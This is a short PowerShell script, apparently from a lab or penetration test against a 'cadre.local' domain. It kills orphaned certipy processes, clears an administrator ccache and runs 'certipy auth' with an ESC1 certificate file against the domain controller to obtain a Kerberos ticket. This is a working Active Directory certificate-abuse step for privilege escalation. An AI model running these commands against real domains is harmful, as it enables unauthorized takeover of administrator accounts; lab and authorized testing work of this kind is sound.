# Kill orphaned certipy procs, clean ccache, re-run auth with fresh TGT
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack

# 1. Kill orphaned certipy processes
Write-Output "=== killing orphaned certipy ==="
Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*certipy*" } | ForEach-Object {
  Write-Output "killing pid=$($_.ProcessId)"
  Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
}

# 2. Remove stale ccache + old logs
Remove-Item C:\Tools\cadre-attack\administrator.ccache -Force -ErrorAction SilentlyContinue
Remove-Item C:\Tools\cadre-attack\auth2.log -Force -ErrorAction SilentlyContinue

# 3. Run certipy auth with debug -> auth2.log (ASCII)
$pfx = "C:\Tools\cadre-attack\C__Tools_cadre-attack_esc1.pfx"
Write-Output "pfx=$pfx exists=$(Test-Path $pfx)"
& $certpy auth -pfx $pfx -dc-ip 192.168.77.10 -domain cadre.local -debug 2>&1 | Out-File -FilePath C:\Tools\cadre-attack\auth2.log -Encoding ascii
Write-Output "auth_rc=$LASTEXITCODE"
Write-Output "=== log tail ==="
Get-Content C:\Tools\cadre-attack\auth2.log | Select-Object -Last 20
Write-Output "=== AUTH4_DONE ==="
